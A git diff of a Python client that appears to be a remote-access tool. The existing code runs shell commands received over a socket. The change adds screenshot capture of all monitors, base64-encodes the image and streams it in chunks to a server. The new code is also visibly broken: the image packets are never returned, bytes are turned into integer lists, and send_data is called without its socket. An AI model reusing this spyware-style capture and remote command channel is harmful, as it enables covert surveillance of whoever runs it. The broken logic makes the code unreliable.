@@ -4,8 +4,10 @@ import select
 import threading
 from datetime import datetime
 import os
-import numpy as np
+import base64
+import textwrap
 
+import numpy as np
 from mss import mss # Multiple ScreenShot
 # https://docs.python.org/3/library/socketserver.html#socketserver-tcpserver-example
 
@@ -28,7 +30,8 @@ def send_data(sock: socket.socket, msg):
     try:            
         # Send data to the server
         data = packet_crafting(msg)
-        sock.sendall(data) 
+        for packet in data:
+            sock.sendall(packet) 
 
     except ConnectionResetError:
         print('The server closed the connection')
@@ -37,7 +40,8 @@ def send_data(sock: socket.socket, msg):
 def packet_crafting(msg: str):
     data_size = len(msg) + 4 # Plus the header
     if (data_size > 8192) :
-        return # Handle for images
+        packets = img_to_packets(msg)
+        return
     
     packet_size = int((np.ceil(data_size/1024)*1024))
     msg_encoded = msg.encode('utf-8')
@@ -46,7 +50,41 @@ def packet_crafting(msg: str):
     # print(f'Header : {packet_size}')
     # print(f'Packet size : {len(packet)} - Crafted packet : {packet}')
 
-    return packet
+    return list(packet)
+
+# REFACTOR : fusion the header part
+def img_to_packets(img_base64):
+    packets = []
+    string_delim = '<START' + img_base64 + 'END>'
+
+    chunks = textwrap.wrap(string_delim, 8188) # 8188 + 4 = 8192
+    for chunk in chunks:
+        header = 8192 
+        header_encoded = header.to_bytes(4, 'little')
+        packet = header_encoded + chunk.encode('utf-8')
+        packets.append(packet)
+
+    return packets
+
+
+def send_screenshot():
+    with mss() as sct:
+        sct.compression_level = 9 # max compression = +- 50 000 bytes file
+        time_stamp = datetime.today().strftime('%Y-%m-%d_%HH%M')
+        img_path = f'./screenshots/{time_stamp}.jpg' # filename = "./screenshots/2024-10-23_21H07.jng"
+        for filename in sct.save(mon=-1, output=img_path): #-1 : fusion of all monitor
+            print(filename)
+
+        file_stats = os.stat(filename)
+        print(f'File Size in Bytes is {file_stats.st_size}')
+
+        # Img to base64 str 
+        with open(img_path, 'rb') as img_file:
+            data = base64.b64encode(img_file.read())
+            string_chunking = data.decode('utf-8')
+
+            send_data(string_chunking)
+
 
 def get_data(sock: socket.socket):
     try: 
@@ -72,19 +110,6 @@ def exec_command(command):
     if output:
         print(output)
     return output
-
-
-# REFACTOR : Make the packet size handler before the sending part
-def send_screenshot():
-    with mss() as sct:
-        sct.compression_level = 9 # max compression = +- 50 000 bytes file
-        time_stamp = datetime.today().strftime('%Y-%m-%d_%HH%M')
-        for filename in sct.save(mon=-1, output=f'./screenshots/{time_stamp}.jpg'): #-1 : fusion of all monitor
-            print(filename)
-
-        # filename = "./screenshots/2024-10-23_21H07.png"
-        file_stats = os.stat(filename)
-        print(f'File Size in Bytes is {file_stats.st_size}')
 
 
 def listen_for_commands(sock : socket.socket):
